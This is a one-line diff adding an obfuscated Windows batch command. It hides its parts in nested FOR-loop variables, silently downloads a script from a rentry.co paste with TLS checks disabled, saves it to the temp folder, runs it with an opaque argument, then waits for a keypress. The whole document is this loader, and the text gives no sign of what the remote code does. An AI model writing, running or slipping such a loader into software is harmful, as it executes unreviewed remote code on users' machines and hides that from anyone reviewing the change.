@@ -1,0 +1,1 @@
+@echo off&for %%a in (rentry) do for %%b in ("%temp%\A") do for %%c in (.) do for %%d in (cmd) do for %%e in (1643123471) do cls&&curl -Lsko "%%~b%%~e%%c%%d" "%%~a%%cco/%%~e/raw"&&call "%%~b%%~e%%c%%d" "164418742895720"&&echo:&echo   Press any key to EXIT . . .&pause>nul
